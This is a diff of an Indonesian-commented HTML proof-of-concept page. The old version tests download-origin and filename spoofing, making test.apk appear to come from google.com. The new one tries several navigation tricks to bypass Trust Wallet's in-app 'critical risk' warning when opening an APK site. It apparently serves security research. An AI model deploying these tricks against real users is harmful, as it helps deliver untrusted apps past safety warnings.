@@ -3,227 +3,134 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>PoC: Download attribution & filename experiments</title>
+  <title>PoC — Trust Wallet popup test (no server)</title>
   <style>
-    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:24px;line-height:1.4;color:#111}
-    h1{font-size:20px;margin-bottom:6px}
-    .note{color:#444;font-size:13px;margin-bottom:18px}
-    .row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px}
-    .btn{background:#0366d6;color:#fff;padding:10px 12px;border-radius:6px;text-decoration:none;border:none;cursor:pointer}
-    .small{font-size:13px;color:#555}
-    label{display:block;margin-top:8px;margin-bottom:6px}
-    input[type=text]{padding:8px;width:100%;max-width:520px}
-    pre{background:#f6f8fa;padding:12px;border-radius:6px;overflow:auto}
-    footer{margin-top:28px;color:#666;font-size:13px}
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;color:#111}
+    h1{font-size:18px}
+    .note{color:#444;margin-bottom:12px;font-size:14px}
+    .row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+    button{padding:8px 10px;border-radius:6px;border:0;background:#0366d6;color:#fff;cursor:pointer}
+    input[type=text]{padding:8px;width:100%;max-width:520px;margin-bottom:8px}
+    pre{background:#f6f8fa;padding:10px;border-radius:6px;height:140px;overflow:auto}
+    small{color:#555}
   </style>
 </head>
 <body>
-  <h1>PoC (single file) — Download attribution & filename</h1>
+  <h1>PoC — Trust Wallet popup test (no server)</h1>
   <p class="note">
-    File ini berisi beberapa metode download untuk menguji behaviour browser: <strong>direct anchor</strong>, <strong>open → redirect</strong> (buka host lain dulu lalu navigasi ke redirect endpoint), <strong>fetch → blob</strong> (atur custom filename via JS), <strong>anchor download</strong>, dan <strong>data: URI</strong>.
-    <br><strong>Catatan penting:</strong> untuk PoC 302 server-side kamu harus deploy server redirect (contoh Express) di domain yang kamu kontrol — lihat komentar di bawah.
+    Upload file ini ke GitHub Pages dan buka di Trust Wallet built-in browser.  
+    Target final: <code>https://apkpure.net/id/amp</code> — tes beberapa metode navigasi untuk lihat apakah popup "critical risk" muncul atau bisa dibypass.
   </p>
 
-  <label for="redirectUrl">Redirect 302 endpoint (deploy sendiri, contoh: <code>https://example-redirect.com/go</code>)</label>
-  <input id="redirectUrl" type="text" placeholder="https://example-redirect.com/go (kosong = disabled)" />
+  <label>Target URL (default: apkpure AMP)</label>
+  <input id="target" type="text" value="https://apkpure.net/id/amp" />
+
+  <label>Initial host (untuk open→navigate trick, default: google)</label>
+  <input id="initial" type="text" value="https://www.google.com" />
 
   <div class="row">
-    <button id="btnDirect" class="btn">Direct: anchor → /test.apk</button>
-    <button id="btnAnchorDownload" class="btn">Anchor download (download attr)</button>
-    <button id="btnFetchBlob" class="btn">Fetch → blob → save as custom name</button>
-    <button id="btnOpenThenOpen" class="btn">Open → then navigate to REDIRECT (open→redirect)</button>
-    <button id="btnNoreferrer" class="btn">Open with rel="noreferrer" (anchor)</button>
-    <button id="btnDataUri" class="btn">Download data: URI (tiny file)</button>
+    <button id="btnDirect">Open direct (window.open target)</button>
+    <button id="btnHref">Navigate current tab (location.href)</button>
+    <button id="btnReplace">Navigate replace (location.replace)</button>
+    <button id="btnNoref">Open with rel="noreferrer" (anchor)</button>
+    <button id="btnOpenThenNav">Open initial then navigate to target (same named tab)</button>
+    <button id="btnMeta">Open page that meta-refresh → target</button>
+    <button id="btnForm">Simulate form submit (POST-like navigation)</button>
+    <button id="btnDocWrite">Open blank then write iframe/navigation (experimental)</button>
   </div>
 
-  <div class="small">
-    <strong>Instruksi singkat:</strong>
-    <ol>
-      <li>Upload <code>test.apk</code> ke root repo (sebelah <code>poc.html</code>).</li>
-      <li>Jika mau uji 302 nyata, deploy server redirect (contoh Express: <code>res.redirect(302, 'https://mohammedalqi.github.io/test.apk')</code>) di domain yang kamu kontrol, lalu masukkan URLnya di field di atas.</li>
-      <li>Buka PoC ini di beberapa browser/OS, lakukan tiap metode, dan screenshot UI download (lihat suggested filename dan "from:" di notification/download panel).</li>
-    </ol>
-  </div>
+  <p><small>Catatan: beberapa method dapat diblok oleh browser in-app policy atau popup blocker. Ambil screenshot/video untuk bukti.</small></p>
 
-  <hr>
-
-  <h3>Detil & tombol PoC</h3>
-  <div class="row">
-    <div>
-      <strong>Direct anchor</strong>
-      <div class="small">Klik akan membuka halaman baru berisi anchor direct ke <code>/test.apk</code></div>
-      <div style="margin-top:8px"><button id="openDirectPage" class="btn">Open direct page</button></div>
-    </div>
-
-    <div>
-      <strong>Anchor with download attribute</strong>
-      <div class="small">Browser akan mencoba gunakan nama file sesuai value <code>download</code> (tergantung policy cross-origin).</div>
-      <div style="margin-top:8px"><button id="anchorDownload" class="btn">Trigger anchor download</button></div>
-    </div>
-
-    <div>
-      <strong>Fetch → blob → custom filename</strong>
-      <div class="small">Ini reliable untuk demo custom filename tanpa mengubah server.</div>
-      <label for="customName">Custom filename:</label>
-      <input id="customName" type="text" value="test downloaded from google.com.apk" />
-      <div style="margin-top:8px"><button id="fetchAndSave" class="btn">Fetch & save</button></div>
-    </div>
-  </div>
-
-  <div class="row" style="margin-top:6px">
-    <div>
-      <strong>Open → then open (PoC kamu: buka google dulu lalu navigasi ke redirect)</strong>
-      <div class="small">Buka host awal (contoh: google.com) di tab bernama <code>x</code>, lalu navigasi tab <code>x</code> ke REDIRECT_URL. Jika REDIRECT_URL melakukan 302 → file, beberapa browser akan men-generate suggested filename yang mengandung host awal.</div>
-      <label for="initialHost">Initial host to open first (e.g. <code>https://www.google.com</code>)</label>
-      <input id="initialHost" type="text" value="https://www.google.com" />
-      <div style="margin-top:8px"><button id="openThenOpen" class="btn">Start open→redirect PoC</button></div>
-    </div>
-
-    <div>
-      <strong>Open with rel="noreferrer"</strong>
-      <div class="small">Menguji effect referer removal (tidak selalu mempengaruhi download UI origin).</div>
-      <div style="margin-top:8px"><button id="openNoref" class="btn">Open noreferrer</button></div>
-    </div>
-
-    <div>
-      <strong>Data: URI (tiny)</strong>
-      <div class="small">Untuk menguji behaviour originless (data: URIs sering tampil tanpa origin).</div>
-      <div style="margin-top:8px"><button id="downloadDataUri" class="btn">Download data URI</button></div>
-    </div>
-  </div>
-
-  <hr>
-
-  <h3>Notes / safety</h3>
-  <div class="small">
-    <ul>
-      <li>GitHub Pages <em>tidak</em> dapat mengeluarkan 302 server-side di domain <code>mohammedalqi.github.io</code>. Untuk PoC 302 nyata, deploy server redirect terpisah di domainmu.</li>
-      <li>Jangan upload file berbahaya. Gunakan APK dummy / harmless test file untuk testing.</li>
-      <li>Jika kamu ingin PoC mengubah suggested filename via server, kamu bisa atur header <code>Content-Disposition</code> di server yang menyajikan file (200 response).</li>
-    </ul>
-  </div>
-
-  <hr>
-
-  <h3>Dev / network helper</h3>
-  <pre id="log" style="height:120px"></pre>
-
-  <footer>
-    Kalau mau, aku bisa buatkan juga script Express (server-302) siap deploy (kamu tinggal push ke Replit/Render/Vercel). Tapi untuk file single-file ini, set <code>REDIRECT_URL</code> di atas field lalu pakai button <strong>Open → then open</strong>.
-  </footer>
+  <h3>Logs</h3>
+  <pre id="log">Ready. Jangan gunakan halaman ini untuk menyebarkan file berbahaya.</pre>
 
 <script>
-/*
-  PoC single-file JavaScript.
-  - Untuk PoC 302 nyata: deploy server redirect sepertinya:
-      const express = require('express');
-      app.get('/go', (req, res) => res.redirect(302, 'https://mohammedalqi.github.io/test.apk'));
-    lalu masukkan https://your-redirect.example/go di field REDIRECT_URL.
-  - Behavior akan berbeda antar browser. Ambil screenshot di tiap browser/OS.
-*/
-
 const logEl = document.getElementById('log');
 function log(s){ logEl.textContent += (new Date()).toLocaleTimeString() + ' — ' + s + '\\n'; logEl.scrollTop = logEl.scrollHeight; }
 
-// Open a small page that contains a direct anchor to /test.apk
-document.getElementById('openDirectPage').addEventListener('click', () => {
-  const w = window.open('', '_blank');
-  const html = `<!doctype html><html><head><meta charset="utf-8"><title>Direct download</title></head><body>
-    <h3>Direct anchor to /test.apk</h3>
-    <p><a href="/test.apk" id="a" download>Download test.apk (direct)</a></p>
-    <script>document.getElementById('a').focus();</script>
-    </body></html>`;
-  w.document.open(); w.document.write(html); w.document.close();
-  log('Opened direct anchor page in new tab.');
+const targetInput = document.getElementById('target');
+const initialInput = document.getElementById('initial');
+
+document.getElementById('btnDirect').addEventListener('click', () => {
+  const url = targetInput.value.trim();
+  window.open(url, '_blank');
+  log('Direct open -> ' + url);
 });
 
-// Anchor with download attribute
-document.getElementById('anchorDownload').addEventListener('click', () => {
+document.getElementById('btnHref').addEventListener('click', () => {
+  const url = targetInput.value.trim();
+  location.href = url;
+  log('location.href -> ' + url);
+});
+
+document.getElementById('btnReplace').addEventListener('click', () => {
+  const url = targetInput.value.trim();
+  location.replace(url);
+  log('location.replace -> ' + url);
+});
+
+document.getElementById('btnNoref').addEventListener('click', () => {
+  // create anchor with noreferrer
   const a = document.createElement('a');
-  a.href = '/test.apk';
-  a.download = 'test-from-anchor.apk'; // browser may ignore for cross-origin
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  log('Triggered anchor download with download attribute (test-from-anchor.apk).');
-});
-
-// Fetch -> blob -> object URL -> download with custom name
-document.getElementById('fetchAndSave').addEventListener('click', async () => {
-  const name = (document.getElementById('customName').value || 'test-custom-name.apk').trim();
-  try {
-    log('Fetching /test.apk ...');
-    const res = await fetch('/test.apk', {cache: 'no-store'});
-    if (!res.ok) { log('Fetch failed: ' + res.status); alert('Fetch failed: ' + res.status); return; }
-    const blob = await res.blob();
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(()=>{ URL.revokeObjectURL(url); a.remove(); log('Downloaded blob as ' + name); }, 15000);
-  } catch (e) {
-    log('Fetch error: ' + e);
-    alert('Fetch error: ' + e);
-  }
-});
-
-// Open -> then open (original poc flow)
-document.getElementById('openThenOpen').addEventListener('click', () => {
-  const initial = (document.getElementById('initialHost').value || 'https://www.google.com').trim();
-  const redirectUrl = (document.getElementById('redirectUrl').value || '').trim();
-  if (!redirectUrl) {
-    alert('Masukkan REDIRECT_URL terlebih dahulu (contoh: https://example-redirect.com/go) untuk menguji open->redirect PoC.');
-    return;
-  }
-  // open initial host in named tab 'x'
-  window.open(initial, 'x');
-  log('Opened initial host: ' + initial + ' in named tab "x".');
-  // after delay, navigate same named tab to redirect endpoint
-  setTimeout(()=> {
-    window.open(redirectUrl, 'x');
-    log('Navigated tab "x" to redirect endpoint: ' + redirectUrl + ' (expect 302 -> final file).');
-  }, 3000);
-});
-
-// Open noreferrer (anchor with rel=noreferrer)
-document.getElementById('openNoref').addEventListener('click', () => {
-  const a = document.createElement('a');
-  a.href = '/test.apk';
+  a.href = targetInput.value.trim();
   a.target = '_blank';
   a.rel = 'noreferrer noopener';
   document.body.appendChild(a);
   a.click();
   a.remove();
-  log('Opened /test.apk with rel="noreferrer".');
+  log('Anchor rel="noreferrer" open -> ' + a.href);
 });
 
-// Data URI download
-document.getElementById('downloadDataUri').addEventListener('click', () => {
-  const a = document.createElement('a');
-  // small text encoded as base64 for demo
-  a.href = 'data:application/octet-stream;base64,SGVsbG8gdGhpcyBpcyBhIHRlc3QgZmlsZQ==';
-  a.download = 'tiny-test.txt';
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  log('Downloaded data: URI (tiny-test.txt).');
+document.getElementById('btnOpenThenNav').addEventListener('click', () => {
+  const initial = initialInput.value.trim() || 'https://www.google.com';
+  const target = targetInput.value.trim();
+  // open initial in named tab 'x', then after delay navigate 'x' to target
+  window.open(initial, 'x');
+  log('Opened initial host in named tab "x": ' + initial);
+  setTimeout(()=> {
+    window.open(target, 'x');
+    log('Navigated named tab "x" to target: ' + target);
+  }, 2000);
 });
 
-// optional: handle Enter key on redirect input to log
-document.getElementById('redirectUrl').addEventListener('change', (e)=> {
-  log('Set REDIRECT_URL to: ' + e.target.value);
+document.getElementById('btnMeta').addEventListener('click', () => {
+  const target = targetInput.value.trim();
+  // open a new tab that contains a meta refresh to target
+  const w = window.open('', '_blank');
+  const html = `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="2;url=${target}"><title>meta redirect</title></head><body>
+    <p>Redirecting to ${target} in 2s...</p>
+    </body></html>`;
+  w.document.open(); w.document.write(html); w.document.close();
+  log('Opened meta-refresh page -> will redirect to ' + target);
 });
-document.getElementById('initialHost').addEventListener('change', (e)=> {
-  log('Set initial host: ' + e.target.value);
+
+document.getElementById('btnForm').addEventListener('click', () => {
+  // create a form and submit it (GET) — some apps treat forms differently
+  const target = targetInput.value.trim();
+  const form = document.createElement('form');
+  form.method = 'GET';
+  form.action = target;
+  form.target = '_blank';
+  document.body.appendChild(form);
+  form.submit();
+  form.remove();
+  log('Submitted form -> ' + target);
 });
-document.getElementById('customName').addEventListener('change', (e)=> {
-  log('Set custom filename: ' + e.target.value);
+
+document.getElementById('btnDocWrite').addEventListener('click', () => {
+  // open blank window then write a link and auto-click it (experimental)
+  const target = targetInput.value.trim();
+  const w = window.open('', '_blank');
+  const html = `<!doctype html><html><head><meta charset="utf-8"><title>docwrite redirect</title></head>
+    <body><p>Loading... will navigate to target</p>
+    <script>setTimeout(()=>{ location.href='${target}' }, 800);</script>
+    </body></html>`;
+  w.document.open(); w.document.write(html); w.document.close();
+  log('Opened blank tab and doc.write -> will navigate to ' + target);
 });
 
 // initial log
-log('PoC ready. Jangan gunakan file berbahaya. Upload test.apk ke root repo untuk menguji direct/fetch.');
+log('PoC loaded. Use Trust Wallet in-app browser to test. Take screenshots/video for each method.');
 </script>
 </body>
 </html>
